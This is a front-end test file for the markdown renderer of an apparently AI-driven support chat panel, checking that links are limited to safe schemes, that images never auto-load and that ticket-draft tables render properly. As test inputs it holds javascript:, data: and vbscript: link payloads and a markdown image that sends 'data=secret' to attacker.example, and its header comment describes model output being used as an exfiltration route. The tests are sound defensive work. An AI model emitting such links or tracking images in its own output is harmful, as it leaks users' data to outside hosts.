/**
 * These are security properties, not styling.
 *
 * The renderer shows model-influenced text, so an attacker-controlled link or an
 * auto-loading image is an exfiltration route (OWASP LLM05). Until now the only
 * thing guarding either was the comment in the source explaining why they matter.
 */
import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { MarkdownMessage } from './MarkdownMessage';

describe('link scheme allowlist', () => {
  it('renders an https link as a real link', () => {
    render(<MarkdownMessage content="[Nabors](https://www.nabors.com/)" />);

    const link = screen.getByRole('link', { name: 'Nabors' });
    expect(link).toHaveAttribute('href', 'https://www.nabors.com/');
  });

  it.each([
    ['javascript', '[click me](javascript:alert(1))'],
    ['data', '[click me](data:text/html;base64,PHNjcmlwdD4=)'],
    ['vbscript', '[click me](vbscript:msgbox)'],
  ])('refuses to render a %s: URL as a link', (_scheme, markdown) => {
    render(<MarkdownMessage content={markdown} />);

    expect(screen.queryByRole('link')).toBeNull();
    // The words survive as plain text; only the navigation is removed.
    expect(screen.getByText(/click me/)).toBeInTheDocument();
  });

  it('allows relative and anchor links, which cannot leave the app', () => {
    render(<MarkdownMessage content="[settings](/settings) and [top](#top)" />);

    expect(screen.getByRole('link', { name: 'settings' })).toHaveAttribute('href', '/settings');
    expect(screen.getByRole('link', { name: 'top' })).toHaveAttribute('href', '#top');
  });

  it('opens external links without handing the opener over', () => {
    render(<MarkdownMessage content="[Nabors](https://www.nabors.com/)" />);

    const link = screen.getByRole('link', { name: 'Nabors' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
    expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'));
  });
});

describe('images are never auto-loaded', () => {
  it('does not emit an img element for a markdown image', () => {
    const { container } = render(
      <MarkdownMessage content="![leak](https://attacker.example/pixel.png?data=secret)" />,
    );

    // An <img> here would fire a request to an attacker-controlled host the
    // moment the message rendered, with no user action at all.
    expect(container.querySelector('img')).toBeNull();
  });
});

describe('ordinary formatting still works', () => {
  it('renders emphasis and lists', () => {
    const { container } = render(<MarkdownMessage content={'**bold**\n\n- one\n- two'} />);

    expect(container.querySelector('strong')).toHaveTextContent('bold');
    expect(container.querySelectorAll('li')).toHaveLength(2);
  });
});

/**
 * The ticket draft is the one place a GFM table reaches the panel, and it is the
 * thing the user approves. remarkGfm parsed it all along, but no `table`/`th`/`td`
 * components were registered and Tailwind's preflight strips default table borders,
 * so the draft rendered as bare crammed text — reported as "the draft appears ugly".
 */
describe('ticket draft tables', () => {
  // The exact shape render_ticket_markdown emits (ticket_creator/template.py).
  const DRAFT = [
    '## Summary',
    '',
    'Cannot sign in to myWells',
    '',
    '## Details',
    '',
    '| Field | Value |',
    '| --- | --- |',
    '| Affected application | Nabors Support |',
    '| Category | user permissions |',
  ].join('\n');

  it('renders the draft metadata as a real table, not run-together text', () => {
    render(<MarkdownMessage content={DRAFT} />);

    expect(screen.getByRole('table')).toBeInTheDocument();
    expect(screen.getByRole('columnheader', { name: 'Field' })).toBeInTheDocument();
    expect(screen.getByRole('cell', { name: 'Affected application' })).toBeInTheDocument();
    expect(screen.getByRole('cell', { name: 'user permissions' })).toBeInTheDocument();
  });

  it('gives the table a border and a scroll container so it cannot widen the panel', () => {
    const { container } = render(<MarkdownMessage content={DRAFT} />);

    // The wrapper scrolls rather than the panel growing — a long field value in a
    // narrow assistant column must not push the conversation sideways.
    expect(container.querySelector('.overflow-x-auto')).toBeInTheDocument();
    expect(screen.getAllByRole('row')[0].className).toContain('border-b');
  });
});
